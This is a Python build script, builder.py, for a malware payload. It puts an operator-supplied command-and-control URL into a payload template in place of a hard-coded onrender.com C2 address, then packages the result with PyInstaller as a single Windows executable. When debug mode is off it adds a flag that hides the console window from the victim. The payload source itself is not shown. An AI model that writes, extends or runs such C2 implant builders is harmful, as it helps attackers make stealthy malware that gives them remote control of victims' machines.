# builder.py (with Debug Mode functionality)
import os
import subprocess
import shutil

def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: bool = False):
    print(f"[*] Starting build for payload '{payload_name}.exe'")
    print(f"[*] Debug Mode: {'ON' if debug_mode else 'OFF'}")
    
    script_dir = os.path.dirname(os.path.abspath(__file__))
    template_path = os.path.join(script_dir, "payload_template.py")
    build_dir = os.path.join(script_dir, "build_temp")
    
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)
    
    configured_payload_path = os.path.join(build_dir, "payload.py")

    try:
        print(f"[*] Configuring payload with C2 URL: {c2_url}")
        with open(template_path, "r") as f:
            content = f.read()
        
        # Replace the placeholder URL in the template
        content = content.replace("https://tether-c2-communication-line-by-ebowluh.onrender.com", c2_url)
        
        with open(configured_payload_path, "w") as f:
            f.write(content)
            
        print("[*] Running PyInstaller...")
        pyinstaller_cmd = ['pyinstaller', '--noconfirm', '--onefile', '--distpath', output_dir, '--name', payload_name]
        
        # ### THIS IS THE KEY CHANGE ###
        # If debug_mode is FALSE, add the '--windowed' flag to hide the console.
        # If debug_mode is TRUE, we DON'T add it, so the console will appear.
        if not debug_mode:
            pyinstaller_cmd.append('--windowed')
            
        pyinstaller_cmd.append(configured_payload_path)
        
        subprocess.run(pyinstaller_cmd, check=True, capture_output=True, text=True)

        print(f"\n[+] Build successful! Payload saved to: {os.path.join(output_dir, f'{payload_name}.exe')}")
        return True

    except subprocess.CalledProcessError as e:
        print("\n[!] BUILD FAILED.")
        print("-" * 50); print(e.stdout); print(e.stderr); print("-" * 50)
        return False
    finally:
        print("[*] Cleaning up temporary build files...")
        if os.path.exists(build_dir): shutil.rmtree(build_dir)
        spec_file = f"{payload_name}.spec"
        if os.path.exists(spec_file): os.remove(spec_file)